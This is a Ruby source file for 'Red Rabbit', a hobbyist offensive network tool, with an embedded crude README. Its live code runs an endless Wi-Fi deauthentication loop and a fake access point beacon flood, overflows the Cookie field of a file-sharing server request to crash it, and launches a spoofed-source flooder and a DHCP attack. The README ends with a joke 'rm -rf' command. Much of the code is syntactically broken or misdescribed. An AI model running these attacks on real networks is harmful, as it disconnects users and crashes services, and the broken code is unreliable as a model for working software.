system("clear")

require 'tty-spinner'

#for some reason it wasnt working or formatting with three requirements 


def wincat
    puts '[+] Loading Readme file'
    puts '''
    this tool is inspired by one of my first ruby frameworks 
    for ethical hacking and web/host discovery
    that tool was named Rube-Ster which had alot 
    of bugs and a shit ton of work that was thrown 
    to the side, so i decided to start this project 
    which is well Red-Rabbit, you may ask where 
    did the name come from, well initally Rube-Sters 
    name cam from ruby hence the Rube- and the ster 
    came from a bunny i used to know and it was named mr booster
    sadly he passed away, anyway hence the name ster
    then red rabbit which is a name derived from the og name 


    ================
    Why this tool? 
    ===============

    this tool has alot of options now for choices such as 

    wifi Death, Fake AP, web port scanners, host port scanners 
    dns, whois, loggers, banner and title parsers, and is written 
    from mainly ruby however utilizes, perl, rust, go, ruby, bash, and batch 
    you will notice batch is for win32-64 installs and bash is used for linux installs 



    =====================
    why so many languages 
    =====================
    well i wanted speed, and since i am currently learning 
    rust, c, perl, ruby, go, and batch i decided to put 
    my skills to the very well known test 

    i also wanted speed 

    to parse the results of a title of the domain
    and to grab it faster i used golang 

    Go -> go-title.go

    i also wanted better exception handeling and easy 
    etsting, especially with net/http parsing and result testing 
    '''
    print """
    so i used perl so i can throw the URl's into a list, parse them 
    and get faster results for testing a internet or stable connections 
    perl is also really good for formatting 

    i wanted it to somehwta be cross platform 

    so i used bash and batch for the installs 

    ==========
    why rust?
    ===========

    simply for faster current network host identification 

    ====================
    why rust IP sniffing?
    ====================

    rust is really fast and a really good language compared to golang 
    sure golang is built from assembly but rust over all is faster 
    when it comes to handeling, socks, networking threadings and more 
    so i built a small IP sniffer from rust 

    ============================================================
    why make the main file in ruby if other languages are faster
    ============================================================ 

    well currently im reading a few books with ruby, and wanted to put 
    my ruby skills to the test to see my limits, and ruby is alot better 
    when it comes to offensive security tools with networking and sending
    payloads over the network or even making something like a windows 
    trojan, so i decided to use it 

    if your still confused and want to debate then ask yourself 

    why is the biggest exploitation framework and the most powerful (MSF/metasploit)
    is 97% built from pure ruby? ''
    =================================== what can this tool do ======================

    spawn fake ap's
    deauthenticate clients off a network 
    do whois domain tracing 
    reverse a dns
    launch DHCMP attacks 
    Flood networks 
    Port Scan Hosts 
    Port Scan Web Hosts 
    IP Parse 
    Find ports on the local network 
    check your current connection 
    Scan the local area for BSSID's and ranges ( its unorganized )
    Fuzz File Sharing Websites ( crash and exploit the servers )
    Arp Spoof Clients off the current network 
    AP scan 




    =============================== REQUIREMENTS ========================
    perl
    python 
    rust 
    rustc
    crates 
    cargo 
    cpan 
    ruby
    bash or batch 
    golang 

    service/script REQUIREMENTS for modules 

    ruby ===

    net/http
    socket 
    time 
    awaite
    optparse 
    iw phy
    timeout 
    http party 
    open uri
    uri
    whois 
    whois-parser
    colorize
    tty-spinner
    ruby-gems 
    openssl

    Go ====

    a fucking os 
    a sys 
    fmt 
    strings 
    net/http
    net/html 

    perl === 
    Ansi color 
    socket 
    Strict 
    HTTP Tiny

    rust === 
    use std::env;
    use std::process::Command;
    use std::io::{self, Write};
    use std::net::{IpAddr, TcpStream};
    use std::str::FromStr;
    use std::process;
    use std::sync::mpsc::{Sender, channel};
    use std::thread;


    =============================== WARNINGS ====================

    ME OR ANYONE WHO CONTRIBUTED OR GAVE IDEAS ARE 
    RESPONSIBLE FOR YOUR DUMBASS MAKING DUMBASS DECISIONS 
    WE HIGHLY DISCLAIM AGAINST USING THIS TOOL FOR MALICOUS 
    ACTIVITY IF YOU HAVE A PROBLEM 

    sudo rm -rf user /usr/share/fuckyourself
    """
    end

def check
    begin
        puts '[~] Checking Mods Before Run'
        require 'colorize'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
      rescue LoadError
        raise "[❌️] Seems you do not have a module "
        puts  "[X] MODULE NOT FOUND"
        exit!
      end 
      require 'packetgen'
      spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
      spinner.auto_spin 
      sleep(1) 
      spinner.stop("Done!") 
      puts '[✅️] Module Found'
      rescue LoadError
        raise "[X] You DO NOT have this module, but why?"
        puts  "[X] MODULE NOT FOUND"
        exit!
      end
def check1
    begin
        require 'whois-parser'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[❌️] Seems you do not have a module "
        puts  "[X] MODULE NOT FOUND"
        exit!
        end 
        require 'whois'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[X] You DO NOT have this module, but why?"
        puts  "[X] MODULE NOT FOUND"
        exit!
        end
def check2
    begin
        require 'optparse'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[❌️] Seems you do not have a module "
        puts  "[X] MODULE NOT FOUND"
        exit!
        end 
        require 'httparty'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[X] You DO NOT have this module, but why?"
        puts  "[X] MODULE NOT FOUND"
        exit!
        end
def check3
    begin
        require 'net/http'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[❌️] Seems you do not have a module "
        puts  "[X] MODULE NOT FOUND"
        exit!
        end 
        require 'uri'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[X] You DO NOT have this module, but why?"
        puts  "[X] MODULE NOT FOUND"
        exit!
        end
def check4
    begin
        require 'open-uri'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[❌️] Seems you do not have a module "
        puts  "[X] MODULE NOT FOUND"
        exit!
        end 
        require 'rubygems'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[X] You DO NOT have this module, but why?"
        puts  "[X] MODULE NOT FOUND"
        exit!
        end                
def check4
    #gem 'net-ssh'
    begin
        require 'rubygems'
        spinner = TTY::Spinner.new("[:spinner] Checking Module ...", format: :pulse_2)
        spinner.auto_spin 
        sleep(1) 
        spinner.stop("Done!") 
        puts '[✅️] Module Found'
        rescue LoadError
        raise "[❌️] Seems you do not have a module "
        puts  "[X] MODULE NOT FOUND"
        exit!
        end 
    end


check()
check1()
check2()
check3()
check4()


require 'colorize'
require 'packetgen'
require 'socket'
require 'open-uri'
require 'rubygems'
require 'timeout'
require 'net/http'
require 'whois'
require 'whois-parser'
require 'socket'
require 'net/ssh'
require 'colorize'
require 'tty-spinner'
require 'optparse'
require 'httparty'
require 'timeout'
require 'uri'
require 'openssl'
#apt install libpcap-dev
#gem install packetgen
#iw phy phy1 interface add mon0 type monitor && ifconfig mon0 up




system("clear")

def clear
    system("clear")
end

def win_check
    if RUBY_PLATFORM =~ /win32/
        puts "You seem to be on windows".colorize(:red)
        puts "Note that you may not have the best experience".colorize(:red)
        print " Would you like to continue Yn >>> "
        yn = gets.chomp
        if yn == 'Y'
            #nothing
        end
        if yn == 'n'
            exit!
        end
    end
end


win_check()

def os
    if RUBY_PLATFORM =~ /win32/
        puts "                                          Detected Os ->  Windows".colorize(:blue)
      elsif RUBY_PLATFORM =~ /linux/
        puts "                                          Detected Os ->  Linux".colorize(:blue)
      elsif RUBY_PLATFORM =~ /darwin/
        puts "                                          Detected Os -> Mac OS X".colorize(:blue)
      elsif RUBY_PLATFORM =~ /freebsd/
        puts "                                          Detected Os -> FreeBSD".colorize(:blue)
      else
        puts "                                          Detected Os -> is unknown".colorize(:blue)
      end
    end

def file_fuzz
    print(" Host IP >>> ")
    host   = gets.chomp || "127.0.0.1"
    puts '--------------'
    puts 'Defualt || 80 '
    print(" Port >>> ")
    port   = gets.chomp || 80
    fuzz   = 40     
    buffer = "A"
    def send_post(host, port, buffer)
        puts "[~] SENDING GET REQ WITH A BUFFER OF -> #{buffer.size} bytes"
        begin
            request = "GET /vfolder.ghp HTTP/1.1\r\n"
            request += "Cookie: SESSIONID=9999; UserID=PassWD=" + buffer + "; frmUserName=; frmUserPass=;\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            s = TCPSocket.open(host, port)
            s.send(request, 0)
            s.close
        rescue Errno::ECONNREFUSED
            puts "[!] Server isnt running or crashed".colorize(:red)
            exit!
        rescue Errno::ECONNRESET
            puts "[!] SERVER HAS CRASHED WITH --> #{buffer.size}-bytes".colorize(:red)
            puts "[!] Targeted Server -> #{host} On Port -> #{port}".colorize(:red)
            exit!
        end
    end
    fuzz.times {|n| send_post(host, port, (buffer += buffer * n)) ; sleep 0.2}
end





def extra() # comming soon 
    puts <<-'EOF'.colorize(:red)
    ______     ______     _____     ______     ______     ______     ______     __     ______  
   /\  == \   /\  ___\   /\  __-.  /\  == \   /\  __ \   /\  == \   /\  == \   /\ \   /\__  _\ 
   \ \  __<   \ \  __\   \ \ \/\ \ \ \  __<   \ \  __ \  \ \  __<   \ \  __<   \ \ \  \/_/\ \/ 
    \ \_\ \_\  \ \_____\  \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\    \ \_\ 
     \/_/ /_/   \/_____/   \/____/   \/_/ /_/   \/_/\/_/   \/_____/   \/_____/   \/_/     \/_/ 
        V 3.0                                 Red Rabbit               Scare_Sec Hackers
                                               
                                               ((`\
                                            ___ \\ '--._
                                         .'`   `'    o  )
                                         /    \   '. __.'
                                       _|    /_  \ \_\_
                                      {_\______\-'\__\_\
                                       -----------------
   EOF
   puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+' Wifi Scanner '.colorize(:red)
   puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+' Web App Fuzzer '.colorize(:red)
   puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+' SQLI Tester '.colorize(:red)
   puts '                                           ['.colorize(:red)+'B'.colorize(:blue)+']'.colorize(:red)+' XSSI Tester '.colorize(:red)
   puts '                                           ['.colorize(:red)+'8'.colorize(:blue)+']'.colorize(:red)+' Scan Local Port'.colorize(:red)
   puts '                                           ['.colorize(:red)+'A'.colorize(:blue)+']'.colorize(:red)+' About (for windows input 99)'.colorize(:red)
   puts '                                           ['.colorize(:red)+'4'.colorize(:blue)+']'.colorize(:red)+' README'.colorize(:red)
   puts '                                           ['.colorize(:red)+'9'.colorize(:blue)+']'.colorize(:red)+' <- Back'.colorize(:red)
   print "                                      >>> ".colorize(:red)
   input = gets.chomp
   if input == '99'
    wincat()
   end
   if input == '3'
    puts '[+] Starting Script...'.colorize(:red)
    system("sudo python3 sql.py ")
    sleep 5
    puts 'Returning to main'
    system("clear")
    main()
    menu()   
   end
   if input == 'B'
    puts '[+] Starting XSS Tester....'.colorize(:red)
    system("sudo python3 xss.py")
    sleep 2
    print("Return to Menu? Y/n >>> ")
    get1 = gets.chomp
    if get1 == 'Y'
        main()
        menu()
    end
    if get1 == 'n'
        puts '[+] Exiting'
    end
end
   if input == '8'
    puts '[+] Starting Rust Scanner'.colorize(:yellow)
    print("PRIVATE HOSTNAME >>> ")
    hostnamerust = gets.chomp
    puts "Targeting Hostname -> #{hostnamerust}".colorize(:yellow)
    puts '[+] Running My Tool Install'
    system("git clone git@github.com:ArkAngeL43/port-scanner-rust.git ; cd port-scanner-rust ; cd src ; cargo run -- -j #{hostnamerust} ")
    print "Press Enter when you want to continue >>> "
    ine = gets.chomp
    main()
    menu()
   end
   if input == 'A'
    puts '[+] Catting file'.colorize(:yellow)
    system("cat read.txt")
   end
   if input == '2' # file sharing server web app socket fuzzer
    puts '[+] Running Fuzzer'.colorize(:blue)
    file_fuzz()
   end
   if input == '9' #leave 
    puts '{+} Going back...'.colorize(:red)
    system("clear")
    main()
    menu()
   end
   if input == '1'
    puts '[+] Starting Monitor....'.colorize(:yellow)# wifi discovery
    system("sudo python3 wifi.py ")
   end
end

def main
    puts <<-'EOF'.colorize(:red)
     ______     ______     _____     ______     ______     ______     ______     __     ______  
    /\  == \   /\  ___\   /\  __-.  /\  == \   /\  __ \   /\  == \   /\  == \   /\ \   /\__  _\ 
    \ \  __<   \ \  __\   \ \ \/\ \ \ \  __<   \ \  __ \  \ \  __<   \ \  __<   \ \ \  \/_/\ \/ 
     \ \_\ \_\  \ \_____\  \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\    \ \_\ 
      \/_/ /_/   \/_____/   \/____/   \/_/ /_/   \/_/\/_/   \/_____/   \/_____/   \/_/     \/_/ 
         V 3.0                                 Red Rabbit               Scare_Sec Hackers
                                                
                                                ((`\
                                             ___ \\ '--._
                                          .'`   `'    o  )
                                          /    \   '. __.'
                                        _|    /_  \ \_\_
                                       {_\______\-'\__\_\
                                        -----------------
    EOF
end

def whois
    system("clear")
    puts 'EX: twitter.com'
    print "Domain Name >>> "
    dom = gets.chomp
    puts '---------'
    puts 'EX: http://twitter.com'
    print "http URL    >>> "
    url = gets.chomp
    whois = Whois::Client.new
    whois.lookup("#{dom}")
    record = Whois.whois("#{dom}")
    parser = record.parser
    register = parser.registered?
    created = parser.created_on 
    main = parser.technical_contacts.first
    puts '------------------------------------------------------------------------'.colorize(:yellow)
    puts "[+] Created    : ".colorize(:red) + "#{created}"
    puts "[+] Registered : ".colorize(:red) + "#{register}"
    puts "\n" + "#{main}"
    puts '-------------------------------------------------------------------------'.colorize(:yellow)
    puts " "
    system("ruby dom-t.rb #{url} #{dom}")
    puts '[~] Name-Servers [~]'.colorize(:blue)
    parser.nameservers.each do |nameserver|
        puts '[+] -> '.colorize(:red) + "#{nameserver}".colorize(:blue)
    end
    puts '----------------------URL TO DOMAIN-------------'
    system("go run go-title.go #{url}")
end



def webscan
    puts 'Ex www.google.com'
    puts '-------------------'
    print"Target World Wide Web link  ~~> ".colorize(:red)
    www = gets.chomp 
    ipa = IPSocket::getaddress("#{www}")
    puts '______________________________________________'
    puts '[+] Scanning Host ~~> '.colorize(:yellow) + ipa
    puts '[+] Scanning 65,000 Ports'.colorize(:yellow)
    puts '----------------------------------------------'.colorize(:red)
    sleep 2
    ports = [
        21,
        22,
        23,
        25,
        53,
        80,
        443,
        3306,
        8080,
        1,
        3,
        4,
        6,
        7,
        9,
        13,
        17,
        19,
        20,
        21,
        22,
        23,
        24,
        25,
        26,
        30,
        32,
        33,
        37,
        42,
        43,
        49,
        53,
        70,
        79,
        80,
        81,
        82,
        83,
        84,
        85,
        88,
        89,
        90,
        99,
        100,
        106,
        109,
        110,
        111,
        113,
        119,
        125,
        135,
        139,
        143,
        144,
        146,
        161,
        163,
        179,
        199,
        211,
        212,
        222,
        254,
        255,
        256,
        259,
        264,
        280,
        301,
        306,
        311,
        340,
        366,
        389,
        406,
        407,
        416,
        417,
        425,
        427,
        443,
        444,
        445,
        458,
        464,
        465,
        481,
        497,
        500,
        512,
        513,
        514,
        515,
        524,
        541,
        543,
        544,
        545,
        548,
        554,
        555,
        563,
        587,
        593,
        616,
        617,
        625,
        631,
        636,
        646,
        648,
        666,
        667,
        668,
        683,
        687,
        691,
        700,
        705,
        711,
        714,
        720,
        722,
        726,
        749,
        765,
        777,
        783,
        787,
        800,
        801,
        808,
        843,
        873,
        880,
        888,
        898,
        900,
        901,
        902,
        903,
        911,
        912,
        981,
        987,
        990,
        992,
        993,
        995,
        999,
        1000,
        1001,
        1002,
        1007,
        1009,
        1010,
        1011,
        1021,
        1022,
        1023,
        1024,
        1025,
        1026,
        1027,
        1028,
        1029,
        1030,
        1031,
        1032,
        1033,
        1034,
        1035,
        1036,
        1037,
        1038,
        1039,
        1040,
        1041,
        1042,
        1043,
        1044,
        1045,
        1046,
        1047,
        1048,
        1049,
        1050,
        1051,
        1052,
        1053,
        1054,
        1055,
        1056,
        1057,
        1058,
        1059,
        1060,
        1061,
        1062,
        1063,
        1064,
        1065,
        1066,
        1067,
        1068,
        1069,
        1070,
        1071,
        1072,
        1073,
        1074,
        1075,
        1076,
        1077,
        1078,
        1079,
        1080,
        1081,
        1082,
        1083,
        1084,
        1085,
        1086,
        1087,
        1088,
        1089,
        1090,
        1091,
        1092,
        1093,
        1094,
        1095,
        1096,
        1097,
        1098,
        1099,
        1100,
        1102,
        1104,
        1105,
        1106,
        1107,
        1719,
        1720,
        1721,
        1723,
        1755,
        1761,
        1782,
        1783,
        1801,
        1805,
        1812,
        1839,
        27000,
        27352,
        27353,
        27355,
        27356,
        27715,
        28201,
        30000,
        30718,
        30951,
        31038,
        31337,
        32768,
        32769,
        32770,
        32771,
        32772,
        32773,
        32774,
        32775,
        32776,
        32777,
        32778,
        32779,
        32780,
        32781,
        32782,
        32783,
        32784,
        32785,
        33354,
        33899,
        34571,
        34572,
        34573,
        35500,
        38292,
        40193,
        40911,
        41511,
        42510,
        44176,
        44442,
        44443,
        44501,
        45100,
        48080,
        49152,
        49153,
        49154,
        49155,
        49156,
        49157,
        49158,
        49159,
        49160,
        49161,
        49163,
        49165,
        49167,
        49175,
        49176,
        49400,
        49999,
        50000,
        50001,
        50002,
        50003,
        50006,
        50300,
        50389,
        50500,
        50636,
        50800,
        51103,
        51493,
        52673,
        52822,
        52848,
        52869,
        54045,
        54328,
        55055,
        55056,
        55555,
        55600,
        56737,
        56738,
        57294,
        57797,
        58080,
        60020,
        60443,
        61532,
        61900,
        62078,
        63331,
        64623,
        64680,
        65000,
        65129,
        65389,]
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ipa, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                puts "[+] --> ".colorize(:red),"[INFO] ~~> ".colorize(:yellow) + "[PORT#{scan}] IS OPEN"
            end
            puts '[SCANNNG RANGE 1...65389]'.colorize(:red)
            rescue Interrupt
                puts '[!] Exiting Scan'
                print "Would you like to go back to the menue Y/n >>> "
                get = gets.chomp
                if get == 'Y'
                    puts '[+] Returning '
                    main()
                    menu()
                end
                if get == 'n'
                    puts '[+] Exiting...'
                    exit!
                end
        end
    end


def hostscan
    print"Target Address ~~> ".colorize(:red)
    ip = gets.chomp 
    sleep 2
    ports = 1..65000
    ports.each do |scan|
        begin
            Timeout::timeout(0.1){TCPSocket.new(ip, scan)}
            rescue
                #puts "[PORT] #{scan} IS [CLOSED]"
            else
                puts "[INFO] ~~> ".colorize(:yellow) + "[PORT#{scan}] IS OPEN"
            end
            #puts '[Finished Scan]'
        end
    end



def deauth
    iface = 'mon0'
    packnum = "100000000000000"
    print("Access Point ~~> ")
    bssid  = gets.chomp
    puts '-----------------------'
    print("Destination  ~~> ")
    client = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').
                        add('Dot11::Management', mac1: client, mac2: bssid, mac3: bssid).
                        add('Dot11::DeAuth', reason: 7)
        puts "Sending Defualt Amount  -> " + packnum 
        puts "[+] Sending Deauth Using --> " + iface + ' to Acess Point --> ' + bssid + 'Too Client --> ' + client 
        pkt.to_w(iface, calc: true, number: 100000000000000, interval: 0.2)
    end
end
    

def rouge
    iface     = 'mon0'
    broadcast = "ff:ff:ff:ff:ff:ff"
    bssid     = "aa:aa:aa:aa:aa:aa"
    print("Fake SSID Name >>> ")
    ssid      = gets.chomp
    while true
        pkt = PacketGen.gen('RadioTap').add('Dot11::Management', mac1: broadcast, mac2: bssid, mac3: bssid)
                                    .add('Dot11::Beacon', interval: 0x600, cap: 0x401)
        pkt.dot11_beacon.elements << {type: 'SSID', value: ssid}
        pp pkt
        100000.times do
        pkt.to_w(iface)
        remote_ip = URI.open('http://whatismyip.akamai.com').read
        puts '[+] ~~> Using IP    '.colorize(:red) + remote_ip 
        puts '[+] ~~> Fake Beacon '.colorize(:red) + ssid + ' USING ~~> '.colorize(:blue) + iface
        end
    end
end

def menu()
    os()
    puts '                                           ['.colorize(:red)+'1'.colorize(:blue)+']'.colorize(:red)+' Rouge AP '.colorize(:red)
    puts '                                           ['.colorize(:red)+'2'.colorize(:blue)+']'.colorize(:red)+' Deauth '.colorize(:red)
    puts '                                           ['.colorize(:red)+'3'.colorize(:blue)+']'.colorize(:red)+' Port Scanner '.colorize(:red)
    puts '                                           ['.colorize(:red)+'A'.colorize(:blue)+']'.colorize(:red)+' Web Port Scan '.colorize(:red)
    puts '                                           ['.colorize(:red)+'4'.colorize(:blue)+']'.colorize(:red)+' Flooder '.colorize(:red)
    puts '                                           ['.colorize(:red)+'5'.colorize(:blue)+']'.colorize(:red)+' DHCMP ATK '.colorize(:red)
    puts '                                           ['.colorize(:red)+'6'.colorize(:blue)+']'.colorize(:red)+' Check Connection '.colorize(:red)
    puts '                                           ['.colorize(:red)+'7'.colorize(:blue)+']'.colorize(:red)+' WHOIS Domain '.colorize(:red)
    puts '                                           ['.colorize(:red)+'8'.colorize(:blue)+']'.colorize(:red)+' More '.colorize(:red)
    puts '                                           ['.colorize(:red)+'9'.colorize(:blue)+']'.colorize(:red)+' Start Interface '.colorize(:red)
    puts '                                           ['.colorize(:red)+'0'.colorize(:blue)+']'.colorize(:red)+' Exit '.colorize(:red)
    print "                                      >>> ".colorize(:red)
    input = gets.chomp
    if input == '9'
        print " [!] Interface to activate >>> "
        inte1 = gets.chomp
        system("sudo airmon-ng start #{inte1}")
        clear()
        main()
        menu()
    end
    if input == '8'
        system("clear")
        extra()
    end
    if input == '7'
        puts '[-] Running...'.colorize(:red)
        whois()
    end
    if input == '6'
        puts 'Testing.....'
        system("perl test.pl")
    end
    if input == '1' # case input acting up use == instead 
        sleep 2
        puts '[+] Loading....'
        rouge() # rouge acess point 
    end
    if input == '2'
        puts '[+] Loading....'
        sleep 1 
        deauth() # deauthentication 
    end
    if input == '3'
        puts '[+] Loading....'
        hostscan()
    end
    if input == '4'
        puts '[+] Loading.....'.colorize(:red)
        puts '------------------'.colorize(:red)
        puts 'Warning! this perl script can send up to'.colorize(:red)
        puts '90000 requests and packets a second '.colorize(:red)
        puts 'use at your own risk!!!'.colorize(:red)
        puts '-------------------'.colorize(:red)
        print("Spoofed Source ~~> ")
        spoof = gets.chomp
        puts '-----------------------'.colorize(:red)
        print("Target Addr    ~~> " )
        target = gets.chomp
        system("sudo perl flood.pl #{spoof} #{target}")
    end
    if input == '5'
        puts '[+] Loading.....'
        system("sudo python3 DHCMP.py")
    end
    if input == '0'
        puts '[-] Exiting'
        sleep 1 
        puts 'Goodbye!'
    end
    if input == 'A'
        puts 'Starting option....'
        sleep 1 
        webscan()
    end
end


def check
    main()
    print(" Interface => ")
    interface = gets.chomp
    command = "sudo airmon-ng start #{interface}" 
    puts '[+] Putting MON0 Interface UP '
    sleep 1 
    puts "[+] Using Command -> #{command}"
    puts "[+] Adding Mon0 "
    sleep 1 
    system("iw phy phy1 interface add mon0")
    system("ifconfig mon0 up")
    system("sudo airmon-ng start #{interface} ")
    puts '[+] Checking Connections'
    url = 'https://www.google.com'
    resur = Net::HTTP.get_response(URI.parse(url.to_s))
    if resur.code == '200'
        puts '[+] Connection OK' 
    elsif resur.code == '301'
        puts '[+] good'
    elsif resur.code == '302'
        puts '[+] Domain not found'
    elsif resur.code == '202'
        puts '[+] Domain Accepted IPA'
    elsif resur.code == '201'
        puts '[+] Domain Created'
    elsif resur.code == '204'
        puts '[-] hmmm not much content here'
    elsif resur.code == '206'
        puts '[-] little content, but why?.....'
    elsif resur.code == '303'
        puts '[-] See another page'
    elsif resur.code == '304'
        puts '[-] Domain Isnt modified yet'
    elsif resur.code == '305'
        puts '[-] try using proxies'
    elsif resur.code == '308'
        puts '[-] perma redirect'
    elsif resur.code == '400'
        puts '[-] Bad Request'
    elsif resur.code == '403'
        puts '[-] your ip is not wanted here'
    elsif resur.code == '405'
        puts '[-] unwanted domain'
    elsif resur.code == '404'
        puts '[-] Domain Not Foud'
    elsif resur.code == '423'
        puts '[-] locked domain'
    elsif resur.code == '425'
        puts '[-] too eraly'
    elsif resur.code == '429'
        puts '[-] way to much requests'
    elsif resur.code == '413'
        puts '[-] Payload to large'
    elsif resur.code == '407'
        puts '[-] hmmmm proxy auth is needed'
    elsif resur.code == '410'
        puts '[-] Domain Gone '
    elsif resur.code == '500'
        puts '[-] Server Side Error'
    elsif resur.code == '503'
        puts '[-] Server Unavalible/Offline'
    else
        puts '[-] Server May be offline '
        puts '[+] Trying a new request '
        sleep 1 
        resur = Net:HTTP.get_response(URI.parse(url.to))
        if resur.code == '200'
            puts '[+] Connection OK'.colorize(:blue)
        elsif resur.code == '301'
            puts '[+] good'
        elsif resur.code == '302'
            puts '[+] Domain not found'
        elsif resur.code == '202'
            puts '[+] Domain Accepted IPA'
        elsif resur.code == '201'
            puts '[+] Domain Created'
        elsif resur.code == '204'
            puts '[-] hmmm not much content here'
        elsif resur.code == '206'
            puts '[-] little content, but why?.....'
        elsif resur.code == '303'
            puts '[-] See another page'
        elsif resur.code == '304'
            puts '[-] Domain Isnt modified yet'
        elsif resur.code == '305'
            puts '[-] try using proxies'
        elsif resur.code == '308'
            puts '[-] perma redirect'
        elsif resur.code == '400'
            puts '[-] Bad Request'
        elsif resur.code == '403'
            puts '[-] your ip is not wanted here'
        elsif resur.code == '405'
            puts '[-] unwanted domain'
        elsif resur.code == '404'
            puts '[-] Domain Not Foud'
        elsif resur.code == '423'
            puts '[-] locked domain'
        elsif resur.code == '425'
            puts '[-] too eraly'
        elsif resur.code == '429'
            puts '[-] way to much requests'
        elsif resur.code == '413'
            puts '[-] Payload to large'
        elsif resur.code == '407'
            puts '[-] hmmmm proxy auth is needed'
        elsif resur.code == '410'
            puts '[-] Domain Gone '
        elsif resur.code == '500'
            puts '[-] Server Side Error'
        elsif resur.code == '503'
            puts '[-] Server Unavalible/Offline'
        else
            puts '[-] Second Test Failed '
        end
    end
end


def emergency_rescue
    n = `host #{domain}`.match(/(\d{1,3}\.){3}\d{1,3}/).to_s
    URI.parse("#{url}").port # => 80
    uri = URI.parse("#{url}")



    if ARGV[1].nil?
        puts <<-'EOF'.colorize(:blue)
        ______     ______     _____     ______     ______     ______     ______     __     ______  
        /\  == \   /\  ___\   /\  __-.  /\  == \   /\  __ \   /\  == \   /\  == \   /\ \   /\__  _\ 
        \ \  __<   \ \  __\   \ \ \/\ \ \ \  __<   \ \  __ \  \ \  __<   \ \  __<   \ \ \  \/_/\ \/ 
        \ \_\ \_\  \ \_____\  \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\    \ \_\ 
        \/_/ /_/   \/_____/   \/____/   \/_/ /_/   \/_/\/_/   \/_____/   \/_____/   \/_/     \/_/ 
            V 3.0                                 Red Rabbit               Scare_Sec Hackers
                                                    
                                                    ((`\
                                                ___ \\ '--._
                                            .'`   `'    o  )
                                            /    \   '. __.'
                                            _|    /_  \ \_\_
                                        {_\______\-'\__\_\
                                            -----------------
        EOF
        puts '[-] No Argument'.colorize(:red)
        sleep 1 
        puts "[-] Try #{__FILE__} https://github.com www.github.com".colorize(:yellow)
        puts "[-] I Need a second link for the WWW in order to ping the IP Server ".colorize(:yellow)
        puts "[+] Try ".colorize(:yellow)
        puts "[+] ruby #{__FILE__} https://google.com www.google.com".colorize(:yellow)
        sleep 3 
        puts '[-] Exiting'.colorize(:red)
        exit!
        


    end
    if ARGV.empty?
        puts <<-'EOF'.colorize(:blue)
        ______     ______     _____     ______     ______     ______     ______     __     ______  
        /\  == \   /\  ___\   /\  __-.  /\  == \   /\  __ \   /\  == \   /\  == \   /\ \   /\__  _\ 
        \ \  __<   \ \  __\   \ \ \/\ \ \ \  __<   \ \  __ \  \ \  __<   \ \  __<   \ \ \  \/_/\ \/ 
        \ \_\ \_\  \ \_____\  \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\    \ \_\ 
        \/_/ /_/   \/_____/   \/____/   \/_/ /_/   \/_/\/_/   \/_____/   \/_____/   \/_/     \/_/ 
            V 3.0                                 Red Rabbit               Scare_Sec Hackers
                                                    
                                                    ((`\
                                                ___ \\ '--._
                                            .'`   `'    o  )
                                            /    \   '. __.'
                                            _|    /_  \ \_\_
                                        {_\______\-'\__\_\
                                            -----------------
        EOF
        puts '[-] No Argument'.colorize(:red)
        sleep 1 
        puts "[-] Try #{__FILE__} https://github.com www.github.com".colorize(:blue)
        puts '[-] Exiting'.colorize(:red)
        exit!
    end

    def banner_help()
        puts <<-'EOF'.colorize(:red)
        ______     ______     _____     ______     ______     ______     ______     __     ______  
        /\  == \   /\  ___\   /\  __-.  /\  == \   /\  __ \   /\  == \   /\  == \   /\ \   /\__  _\ 
        \ \  __<   \ \  __\   \ \ \/\ \ \ \  __<   \ \  __ \  \ \  __<   \ \  __<   \ \ \  \/_/\ \/ 
        \ \_\ \_\  \ \_____\  \ \____-  \ \_\ \_\  \ \_\ \_\  \ \_____\  \ \_____\  \ \_\    \ \_\ 
        \/_/ /_/   \/_____/   \/____/   \/_/ /_/   \/_/\/_/   \/_____/   \/_____/   \/_/     \/_/ 
